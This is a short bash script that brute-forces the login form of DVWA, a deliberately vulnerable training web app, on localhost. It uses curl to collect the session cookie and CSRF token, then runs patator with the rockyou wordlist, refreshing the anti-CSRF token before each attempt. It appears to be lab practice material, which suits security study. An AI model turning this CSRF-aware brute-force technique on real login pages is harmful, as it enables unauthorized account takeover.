#!/bin/bash
clear
CSRF=$(curl -s -c dvwa.cookie "127.0.0.1/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')


patator  http_fuzz  method=POST  follow=0  accept_cookie=0  --threads=1  timeout=5  --max-retries=0 \
  resolve=localhost:127.0.0.1 \
  url="localhost/login.php" \
  1=users.txt  0=rockyou.txt \
  body="username=FILE1&password=FILE0&user_token=_CSRF_&Login=Login" \
  header="Cookie: security=high; PHPSESSID=${SESSIONID}" \
  before_urls="localhost/login.php" \
  before_header="Cookie: security=high; PHPSESSID=${SESSIONID}" \
  before_egrep="_CSRF_:<input type='hidden' name='user_token' value='(\w+)' />" \
  -x quit:egrep='Location: (?!(login.php)).*'
